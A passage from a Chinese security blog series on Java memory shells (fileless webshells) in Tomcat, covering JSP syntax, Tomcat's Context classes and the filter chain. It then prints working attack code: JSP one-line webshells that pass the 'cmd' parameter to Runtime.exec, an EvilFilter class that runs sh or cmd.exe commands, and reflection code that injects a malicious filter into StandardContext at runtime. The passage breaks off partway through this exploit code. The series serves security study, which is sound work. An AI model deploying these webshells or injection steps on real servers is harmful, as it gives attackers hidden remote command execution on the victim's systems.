参考资料http://miku233.viewofthai.link/2022/05/29/Tomcat/https://blog.csdn.net/qq_34101364/article/details/120856415https://www.freebuf.com/articles/web/321975.htmlhttps://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat%E4%BB%8B%E7%BB%8D/Tomcat%E4%BB%8B%E7%BB%8D.md\n","categories":["Java"],"tags":["Java"]},{"title":"Java内存马系列-02-内存马介绍","url":"/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/","content":"内存马和 JSP 的基础知识\n\n\n0x01 前言Java 内存马这一块要学的基础知识还是蛮多的，所以还是先把基础打牢了，再去看攻击方法比较好。\n0x02 内存马简史由于现在各种防护措施越来越多，文件shell就如c0ny1师傅所说的大部分已经气数已尽，内存马因其隐蔽性等优点从而越来越盛行。\n其实内存马由来已久，早在17年n1nty师傅的《Tomcat源码调试笔记-看不见的shell》中已初见端倪，但一直不温不火。后经过rebeyong师傅使用agent技术加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的Spring controller内存马。至此内存马开枝散叶发展出了三大类型：\n\nservlet-api类\nfilter型\nservlet型\n\n\nspring类\n拦截器\ncontroller型\n\n\nJava Instrumentation类\nagent型\n\n\n\n\n在讲内存马之前，我们还是看一看 jsp 基础。\n\n0x03 JSP 基础\n首先是 JSP 环境的搭建，我们要起一个 JSP 的环境，有的教程说起 SpringMVC 的，其实完全没必要，简单的 JSP 即可。\n\n1. 什么是JSPJSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动println一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。\nJSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。\n当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。\n2. JSP 环境的搭建可以直接看我这篇文章，其他文章感觉说的有点玄乎了，其实 IDEA 里面内置了 JSP 的项目框架，可以直接搭建的。\nServlet 项目搭建\n3. JSP的语法脚本程序脚本程序可以包含任意量的Java语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序的格式如下\n&lt;% 代码片段 %>\n\n下面是使用示例\n&lt;html>  \n&lt;body>  \n&lt;h2>Hello World!!!&lt;/h2>  \n&lt;% out.println(\"GoodBye!\"); %>  \n&lt;/body>  \n&lt;/html>\n\nJSP声明一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式如下\n&lt;%! 声明  %>\n\n同样等价于下面的XML语句\n&lt;jsp:declaration>   \n代码片段\n&lt;/jsp:declaration>\n\n\n\n下面是使用示例\n&lt;html>\n&lt;body>\n&lt;h2>Hello World!!!&lt;/h2>\n&lt;%! String s= \"GoodBye!\"; %>\n&lt;% out.println(s); %>\n&lt;/body>\n&lt;/html>\n\n\n\n其实在脚本里面也是可以直接进行声明的\n&lt;%  \n    int i = 3;  \n%>\n\nJSP 表达式&lt;%= 表达式 %>\n\n等价于下面的XML表达式\n&lt;jsp:expression>   表达式&lt;/jsp:expression>\n\n下面是使用示例\n&lt;html>\n&lt;body>\n&lt;h2>Hello World!!!&lt;/h2>\n&lt;p>&lt;% String name = \"Drunkbaby\"; %>username:&lt;%=name%>&lt;/p>\n&lt;/body>\n&lt;/html>\n\n输出如图\n\n\nJSP 指令JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令\n\n比如我们能通过page指令来设置jsp页面的编码格式\n&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n\n回显是一样的，因为 JSP 属于模板引擎\nJSP 注释格式如下\n&lt;%-- 注释内容 --%>\n\n4. JSP内置对象JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下\n\n由 JSP 规范提供，不用编写者实例化\n通过 Web 容器实现和管理\n所有 JSP 页面均可使用\n只有在脚本元素的表达式或代码段中才能使用\n\n\n\n\n\n对&nbsp; 象\n\n类型\n\n说&nbsp; 明\n\n\n\nrequest\n\njavax.servlet.http.HttpServletRequest\n\n获取用户请求信息\n\n\n\nresponse\n\njavax.servlet.http.HttpServletResponse\n\n响应客户端请求，并将处理信息返回到客户端\n\n\n\nout\n\njavax.servlet.jsp.JspWriter\n\n输出内容到 HTML 中\n\n\n\nsession\n\njavax.servlet.http.HttpSession\n\n用来保存用户信息\n\n\n\napplication\n\njavax.servlet.ServletContext\n\n所有用户共享信息\n\n\n\nconfig\n\njavax.servlet.ServletConfig\n\n这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数\n\n\n\npageContext\n\njavax.servlet.jsp.PageContext\n\nJSP 的页面容器，用于访问&nbsp;page、request、application 和 session 的属性\n\n\n\npage\n\njavax.servlet.jsp.HttpJspPage\n\n类似于 Java 类的 this 关键字，表示当前 JSP 页面\n\n\n\nexception\n\njava.lang.Throwable\n\n该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。\n\n\n\n\n0x04 传统内存马\n讲完了 Tomcat 架构的理解和 JSP 的一些基础，我们可以正式开始学习内存马了\n\n我们先来看一看传统的 JSP 内存马是什么样子的。\n&lt;% \n\n\tRuntime.getRuntime().exec(request.getParameter(\"cmd\"));\n\n%>\n\n上面是最简单的一句话木马，没有回显，适合用来反弹shell。我们这里弹个计算器看一看。\n\n\n下面是一个带回显的JSP木马\n&lt;% if(request.getParameter(\"cmd\")!=null)&#123;\n    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\n    int a = -1;\n    byte[] b = new byte[2048];\n    out.print(\"&lt;pre>\");\n    while((a=in.read(b))!=-1)&#123;\n        out.print(new String(b));\n    &#125;\n    out.print(\"&lt;/pre>\");\n&#125;\n \n%>\n\n\n\n传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。\n\n利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。\n修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。\n\n0x05 Tomcat 中的三个 Context 的理解Contextcontext是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？\n根据yzddmr6师傅的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。\n在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。\nServletContextServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。\n大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等\npackage javax.servlet;\n \n \nimport java.io.InputStream;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Enumeration;\nimport java.util.EventListener;\nimport java.util.Map;\nimport java.util.Set;\nimport javax.servlet.ServletRegistration.Dynamic;\nimport javax.servlet.descriptor.JspConfigDescriptor;\n \n \npublic interface ServletContext &#123;\n    String TEMPDIR = \"javax.servlet.context.tempdir\";\n \n    String getContextPath();\n    ServletContext getContext(String var1);\n    int getMajorVersion();\n    int getMinorVersion();\n    int getEffectiveMajorVersion();\n    int getEffectiveMinorVersion();\n    String getMimeType(String var1);\n    Set getResourcePaths(String var1);\n    URL getResource(String var1) throws MalformedURLException;\n    InputStream getResourceAsStream(String var1);\n    RequestDispatcher getRequestDispatcher(String var1);\n    RequestDispatcher getNamedDispatcher(String var1);\n    /** @deprecated */\n    Servlet getServlet(String var1) throws ServletException;\n    /** @deprecated */\n    Enumeration getServlets();\n    /** @deprecated */\n    Enumeration getServletNames();\n    void log(String var1);\n    /** @deprecated */\n    void log(Exception var1, String var2);\n    void log(String var1, Throwable var2);\n    String getRealPath(String var1);\n    String getServerInfo();\n    String getInitParameter(String var1);\n    Enumeration getInitParameterNames();\n    boolean setInitParameter(String var1, String var2);\n    Object getAttribute(String var1);\n    Enumeration getAttributeNames();\n \n    void setAttribute(String var1, Object var2);\n \n    void removeAttribute(String var1);\n \n    String getServletContextName();\n    \n    Dynamic addServlet(String var1, String var2);\n \n    Dynamic addServlet(String var1, Servlet var2);\n \n \n    Dynamic addServlet(String var1, Class var2);\n \n     extends Servlet> T createServlet(Classvar1) throws ServletException;\n \n    ServletRegistration getServletRegistration(String var1);\n \n    Map ? extends ServletRegistration> getServletRegistrations();\n \n    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);\n \n    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);\n \n    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class var2);\n \n     extends Filter> T createFilter(Classvar1) throws ServletException;\n    FilterRegistration getFilterRegistration(String var1);\n    Map ? extends FilterRegistration> getFilterRegistrations();\n    SessionCookieConfig getSessionCookieConfig();\n    void setSessionTrackingModes(Setvar1);\n \n    Set getDefaultSessionTrackingModes();\n \n    Set getEffectiveSessionTrackingModes();\n \n    void addListener(String var1);\n     extends EventListener> void addListener(T var1);\n \n    void addListener(Class var1);\n     extends EventListener> T createListener(Classvar1) throws ServletException;\n    JspConfigDescriptor getJspConfigDescriptor();\n    ClassLoader getClassLoader();\n    void declareRoles(String... var1);\n&#125;\n\n可以看到ServletContext接口中定义了很多操作，能对Servlet中的各种资源进行访问、添加、删除等。\nApplicationContext在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看这篇文章，简单来讲就是加一层包装。也可以理解为 AOP 吧\n其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等\nStandardContextorg.apache.catalina.core.StandardContext是子容器Context的标准实现类，其中包含了对Context子容器中资源的各种操作。四种子容器都有其对应的标准实现如下\n\n\n而在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法\n\n\n...\n@Override\n    public String getRequestCharacterEncoding() &#123;\n        return context.getRequestCharacterEncoding();\n    &#125;\n...\n\nTomcat 三个 Context 总结我们可以用一张图来表示各Context的关系\n\n\nServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。\n0x06 小结\n简单看了看 JSP 与 Tomcat 中三个 Context 的一些东西，感觉还好。\n\n","categories":["Java"],"tags":["Java"]},{"title":"Java内存马系列-03-Tomcat 之 Filter 型内存马","url":"/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/343105.html\n\n\nJava内存马系列-03-Tomcat 之 Filter 型内存马0x01 前言学过 Servlet 的应该都知道 filter (过滤器)，我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作，下面是一张简单的流程图\n\n\n从上图可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell\n所以我们后文的目标：动态注册恶意 Filter，并且将其放到 最前面\n0x02 Tomcat Filter 流程分析在学习 Filter 内存马的注入之前，我们先来分析一下正常 Filter 在 Tocat 中的流程是怎么样的。\n项目搭建\nMaven 3.6.3\nTomcat 8.5.81\n\n首先在IDEA中创建Servlet，如不知道如何创建可以看我的另外一篇文章 Servlet 项目搭建 | 芜风 (drun1baby.github.io)。\n自定义 Filter\nimport javax.servlet.*;  \nimport java.io.IOException;  \n  \npublic class filter implements Filter&#123;  \n    @Override  \n public void init(FilterConfig filterConfig) throws ServletException &#123;  \n        System.out.println(\"Filter 初始构造完成\");  \n &#125;  \n  \n    @Override  \n public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  \n        System.out.println(\"执行了过滤操作\");  \n filterChain.doFilter(servletRequest,servletResponse);  \n &#125;  \n  \n    @Override  \n public void destroy() &#123;  \n  \n    &#125;  \n&#125;\n\n然后修改 web.xml 文件，这里我们设置url-pattern为 /filter 即访问 /filter 才会触发\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"  \n version=\"4.0\">  \n &lt;filter> &lt;filter-name>filter&lt;/filter-name>  \n &lt;filter-class>filter&lt;/filter-class>  \n &lt;/filter>  \n &lt;filter-mapping> &lt;filter-name>filter&lt;/filter-name>  \n &lt;url-pattern>/filter&lt;/url-pattern>  \n &lt;/filter-mapping>&lt;/web-app>\n\n访问 url，触发成功。\n\n\n接下来我们来分析一下 Tomcat 中是如何将我们自定义的 filter 进行设置并且调用的\n哦对了，别忘了 pom.xml 里面加上 tomcat 的依赖库\n&lt;dependencies>  \n &lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina -->  \n &lt;dependency>  \n &lt;groupId>org.apache.tomcat&lt;/groupId>  \n &lt;artifactId>tomcat-catalina&lt;/artifactId>  \n &lt;version>8.5.81&lt;/version>  \n &lt;scope>provided&lt;/scope>  \n &lt;/dependency>&lt;/dependencies>\n\n在访问 &#x2F;filter 之后的流程分析\n前情提要，有一些师傅的文章写的比较不清楚，看起来好像和调试没什么关系，其实只是因为有些师傅是分析 doFilter() 方法之前的东西，也有师傅是分析 doFilter() 方法之后的东西。\n\n流程分析之前，需要像刚才导入 Servlet.jar 一样，导入 catalina.jar 这个包，以及 tomcat-websocket 包。\n导入完毕之后，我们在 filter.java 下的 doFilter 这个地方打断点。并且访问 &#x2F;filter 接口，至此，调试正式开始。\n\n\n\n这里因为我们已经新建了一个 Filter，所以会直接进入到 doFilter 方法，我们跟进去。\n\n这里会进到 ApplicationFilterChain 类的 doFilter() 方法，它主要是进行了 Globals.IS_SECURITY_ENABLED，也就是全局安全服务是否开启的判断。\n\n\n单步 f8 进去，直接走到了结尾，代码如下\nthis.internalDoFilter(request, response);\n\n我们继续跟进去，这里是 ApplicationFilterChain 类的 internalDoFilter() 方法\n\n\n其中filter是从 ApplicationFilterConfig filterConfig = filters[pos++];中来的，而filters的定义如下：\nprivate ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];\n\n现在我们其实是有两个 filter 的，如图\n\n可以看到，0 是我们自己设定的 filter，1 是 tomcat 自带的 filter，因为此时 pos 是 1 所以取到 tomcat 的 filter。\n我们继续往里走，这里就调用了 tomcat 的 filter 的 doFilter() 方法\n\n\n再往下走，会走到 chain.doFilter() 这个地方，我们会发现这一个方法会回到 ApplicationFilterChain 类的 DoFilter() 方法里面\n\n\n\n这个地方实际需要理解一下，因为我们是一条 Filter 链，所以会一个个获取 Filter，直到最后一个。\n\n那么现在我们只定义了一个 Filter，所以现在这次循环获取 Filter 链就是最后一次。\n\n\n在最后一次获取 Filter 链的时候，会走到 this.servlet.service(request, response); 这个地方\n\n\n总的来说\n\n最后一个 filter 调用 servlet 的 service 方法 \n上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；这也就是我们的 Filter 链，是去逐个获取的。\n最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。 \n只要 Filter 链中任意一个 Filter 没有调用 FilterChain.doFilter() 方法，则目标 Servlet.service() 方法都不会被执行。\n至此，我们的正向分析过程就结束了，得到的结论是 Filter Chain 的调用结构是一个个 doFilter() 的，最后一个 Filter 会调用 Servlet.service()\n在访问 &#x2F;filter 之前的流程分析分析目的在于：假设我们基于filter去实现一个内存马，我们需要找到filter是如何被创建的。\n\n我们可以把断点下载最远的一处 invoke() 方法的地方\n\n在 doFilter() 方法之前，一整个流程如图\n\n\n\n此处我们选到最远处的一个 invoke() 方法，如图。\n\n\n\n我们看到现在的类是 StandardEngineValve，对应的 Pipeline 就是 EnginePipeline；它进行了 invoke() 方法的调用，这个 invoke() 方法的调用的目的地是 AbstractAccessLogValve 类的 invoke() 方法。其实这一步已经安排了一个 request, wrapper, servlet 传递的顺序。\n\n\n接着是 AbstractAccessLogValve 类的 invoke() 方法，然后就是一步步调用 invoke() 方法。\n\n\n可以用这张图来表示这一整个过程。\n\n\n至此，invoke() 部分的所有流程我们都分析完毕了，接着继续往上看，也就是 doFilter() 方法。这个 doFilter() 方法也是由最近的那个 invoke() 方法调用的。如图，我们把断点下过去。如果师傅们这个 invoke() 方法可用的话，可以断点下这里，如果不可用的话可以下到后面的 doFilter() 方法。\n\n\n这里我们要重点关注前文说过的 filterChain 这个变量，它是什么呢？\n\n\n我们跟进 createFilterChain() 这个方法。使用 ApplicationFilterFactory.createFilterChain() 创建了一个过滤链，将 request, wrapper, servlet 进行传递。\n\n\n我们在 createFilterChain() 方法走一下流程。这里就是判断 FilterMaps 是否为空，若为空则会调用context.findFilterMaps()从StandardContext寻找并且返回一个FilterMap数组。\n\n\n再看后面的代码\n\n\n遍历StandardContext.filterMaps得到filter与URL的映射关系并通过matchDispatcher()、matchFilterURL()方法进行匹配，匹配成功后，还需判断StandardContext.filterConfigs中，是否存在对应filter的实例，当实例不为空时通过addFilter方法，将管理filter实例的filterConfig添加入filterChain对象中。\n\n\n这时候我们再进入 doFilter() 的方法其实是，将请求交给其 pipeline 去处理，由 pipeline 中的所有 valve 顺序处理请求。后续的就是我们前文分析过的 在访问 &#x2F;filter 之后的流程分析\n小结一下分析流程\n这一块我们可以把两个流程总结一下，总结完之后 Tomcat Filter 流程就变的比较简单。\n\n1. 首先是 invoke() 方法层层调用管道，在最后一个管道的地方会创建一个链子，这个链子是 FilterChain，再对里头的 filter 进行一些相关的匹配。\n2. filterchain 拿出来之后进行 doFilter() 工作，将请求交给对应的 pipeline 去处理，也就是进行一个 doFilter() —-&gt; internalDoFilter() —-&gt; doFilter()；直到最后一个 filter 被调用。\n3. 最后一个 filter最后一个 filter 会执行完 doFilter() 操作，随后会跳转到 Servlet.service() 这里。至此，流程分析完毕。\n4. 小结一下攻击的思路分析完了运行流程，那应该对应的也思考一下如何攻击。\n我们的攻击代码，应该是生效于这一块的\n\n\n我们只需要构造含有恶意的 filter 的 filterConfig 和拦截器 filterMaps，就可以达到触发目的了，并且它们都是从 StandardContext 中来的。\n而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"  \n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"  \n version=\"4.0\">  \n &lt;filter> &lt;filter-name>filter&lt;/filter-name>  \n &lt;filter-class>filter&lt;/filter-class>  \n &lt;/filter>  \n &lt;filter-mapping> &lt;filter-name>filter&lt;/filter-name>  \n &lt;url-pattern>/filter&lt;/url-pattern>  \n &lt;/filter-mapping>&lt;/web-app>\n\n\n所以后续的话，我们一定是思考通过某种方式去触发修改它的。\n\n0x03 Filter 型内存马攻击思路分析\n上文我们说到，我们一定是思考通过某种方式去触发修改 filterMaps 的，也就是如何修改 web.xml 中的 filter-mapping 标签。\n\nfilterMaps 可以通过如下两个方法添加数据，对应的类是 StandardContext 这个类\n@Override\npublic void addFilterMap(FilterMap filterMap) &#123;\n    validateFilterMap(filterMap);\n    // Add this filter mapping to our registered set\n    filterMaps.add(filterMap);\n    fireContainerEvent(\"addFilterMap\", filterMap);\n&#125;\n\n@Override\npublic void addFilterMapBefore(FilterMap filterMap) &#123;\n    validateFilterMap(filterMap);\n    // Add this filter mapping to our registered set\n    filterMaps.addBefore(filterMap);\n    fireContainerEvent(\"addFilterMap\", filterMap);\n&#125;\n\nStandardContext 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。\n里面有三个和Filter有关的成员变量：\n\nfilterMaps变量：包含所有过滤器的URL映射关系 \n\nfilterDefs变量：包含所有过滤器包括实例内部等变量 \n\nfilterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理\n\nfilterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的ApplicationFilterConfig对象的键值对，在ApplicationFilterConfig对象中则存储了Filter实例以及该实例在web.xml中的注册信息。\nfilterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应FilterDef的对象的键值对，而FilterDef对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据\nfilterMaps 中的FilterMap则记录了不同filter与UrlPattern的映射关系\nprivate HashMap&lt;String, ApplicationFilterConfig> filterConfigs = new HashMap(); \n\nprivate HashMap&lt;String, FilterDef> filterDefs = new HashMap(); \n\nprivate final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();\n\n\n讲完了一些基础的概念，我们来看一看 ApplicationFilterConfig 里面存了什么东西\n\n\n\n它有三个重要的东西：一个是ServletContext，一个是filter，一个是filterDef\n\n其中filterDef就是对应web.xml中的filter标签了\n\n&lt;filter>  \n &lt;filter-name>filter&lt;/filter-name>  \n &lt;filter-class>filter&lt;/filter-class>  \n&lt;/filter>\n\n从org.apache.catalina.core.StandardContext#filterStart中可以看到filterConfig可以通过filterConfigs.put(name, filterConfig);添加\npublic boolean filterStart() &#123;\n\n        if (getLogger().isDebugEnabled()) &#123;\n            getLogger().debug(\"Starting filters\");\n        &#125;\n        // Instantiate and record a FilterConfig for each defined filter\n        boolean ok = true;\n        synchronized (filterConfigs) &#123;\n            filterConfigs.clear();\n            for (Entry&lt;String,FilterDef> entry : filterDefs.entrySet()) &#123;\n                String name = entry.getKey();\n                if (getLogger().isDebugEnabled()) &#123;\n                    getLogger().debug(\" Starting filter '\" + name + \"'\");\n                &#125;\n                try &#123;\n                    ApplicationFilterConfig filterConfig =\n                            new ApplicationFilterConfig(this, entry.getValue());\n                    filterConfigs.put(name, filterConfig);\n                &#125; catch (Throwable t) &#123;\n                    t = ExceptionUtils.unwrapInvocationTargetException(t);\n                    ExceptionUtils.handleThrowable(t);\n                    getLogger().error(sm.getString(\n                            \"standardContext.filterStart\", name), t);\n                    ok = false;\n                &#125;\n            &#125;\n        &#125;\n\n        return ok;\n    &#125;\n\n\n构造思路通过前文分析，得出构造的主要思路如下1、获取当前应用的ServletContext对象2、通过ServletContext对象再获取filterConfigs2、接着实现自定义想要注入的filter对象4、然后为自定义对象的filter创建一个FilterDef5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现\n0x04 Filter 型内存马的实现我们先来看一下 JSP 的无回显的内存马：\n&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>\n\n是这样的，简单的命令执行，接着我们看有回显的木马\n&lt;% if(request.getParameter(\"cmd\")!=null)&#123;\n    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\n    int a = -1;\n    byte[] b = new byte[2048];\n    out.print(\"&lt;pre>\");\n    while((a=in.read(b))!=-1)&#123;\n        out.print(new String(b));\n    &#125;\n    out.print(\"&lt;/pre>\");\n&#125;\n \n%>\n\n\n\n那么现在，我们要把这个恶意的有回显的🐎插入到 Filter 里面进去，也就是说要配置一个恶意的 Filter，代码如图\nimport javax.servlet.*;  \nimport javax.servlet.annotation.WebFilter;  \nimport javax.servlet.annotation.WebServlet;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \n  \nimport java.io.IOException;  \nimport java.io.InputStream;  \nimport java.util.Scanner;  \n  \n\npublic class EvilFilter implements Filter &#123;  \n    public void destroy() &#123;  \n    &#125;  \n  \n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123;  \n        HttpServletRequest req = (HttpServletRequest) request;  \n HttpServletResponse resp = (HttpServletResponse) response;  \n if (req.getParameter(\"cmd\") != null) &#123;  \n            boolean isLinux = true;  \n String osTyp = System.getProperty(\"os.name\");  \n if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(\"win\")) &#123;  \n                isLinux = false;  \n &#125;  \n            String[] cmds = isLinux ? new String[]&#123;\"sh\", \"-c\", req.getParameter(\"cmd\")&#125; : new String[]&#123;\"cmd.exe\", \"/c\", req.getParameter(\"cmd\")&#125;;  \n InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  \n Scanner s = new Scanner(in).useDelimiter(\"\\\\A\");  \n String output = s.hasNext() ? s.next() : \"\";  \n resp.getWriter().write(output);  \n resp.getWriter().flush();  \n &#125;  \n        chain.doFilter(request, response);  \n &#125;  \n  \n    public void init(FilterConfig config) throws ServletException &#123;  \n  \n    &#125;  \n  \n&#125;\n\n记得先把 web.xml 里面的类修改为 EvilFilter。并将 web.xml 的这一内容修改如下 &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n\n先跑一下测试一下，成功\n\n\n\n本质上其实就是 Filter 中接受执行参数，但是如果我们在现实情况中需要动态的将该 Filter 给添加进去。\n由前面Filter实例存储分析得知 StandardContext Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。那么如何获取到StandardContext 成为了问题的关键。\n我们一开始尝试通过这种方式获取，是会报错的\nWebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  \n\nStandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();  \n\nStandardContext standardContext = (StandardContext) standardroot.getContext();\n\n\n\n\n下面是可用的 EXP\n\nFilter 型内存马 EXP我们这里尝试分步骤自己手写一下 EXP，构造思路在上面，这里就不赘述了，画一个流程图方便师傅们理解一下。\n\n\n先是通过反射获取到 standContext\nServletContext servletContext = request.getSession().getServletContext();  \n  \n Field appctx = servletContext.getClass().getDeclaredField(\"context\");  \n appctx.setAccessible(true);  \n ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  \n  \n Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");  \n stdctx.setAccessible(true);  \n StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  \n  \n  \n  \n String FilterName = \"cmd_Filter\";  \n Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");  \n Configs.setAccessible(true);  \n filterConfigs = (Map) Configs.get(standardContext); \n\n\n接着，定义一个 Filter\n\nFilter filter = new Filter() &#123;  \n  \n                    @Override  \n public void init(FilterConfig filterConfig) throws ServletException &#123;  \n  \n                    &#125;  \n  \n                    @Override  \n public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  \n                        HttpServletRequest req = (HttpServletRequest) servletRequest;  \n if (req.getParameter(\"cmd\") != null)&#123;  \n  \n                            InputStream in = Runtime.getRuntime().exec(req.getParameter(\"cmd\")).getInputStream();  \n//  \n Scanner s = new Scanner(in).useDelimiter(\"\\\\A\");  \n String output = s.hasNext() ? s.next() : \"\";  \n servletResponse.getWriter().write(output);  \n  \n return; &#125;  \n                        filterChain.doFilter(servletRequest,servletResponse);  \n &#125;  \n  \n                    @Override  \n public void destroy() &#123;  \n  \n                    &#125;  \n                &#125;;\n\n\n再设置 FilterDef 和 FilterMaps\n\n//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加  \nClass&lt;?> FilterDef = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterDef\");  \nConstructor declaredConstructors = FilterDef.getDeclaredConstructor();  \nFilterDef o = (FilterDef) declaredConstructors.newInstance();  \no.setFilter(filter);  \no.setFilterName(FilterName);  \no.setFilterClass(filter.getClass().getName());  \nstandardContext.addFilterDef(o);  \n//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去  \nClass&lt;?> FilterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");  \nConstructor&lt;?> declaredConstructor = FilterMap.getDeclaredConstructor();  \norg.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();  \n  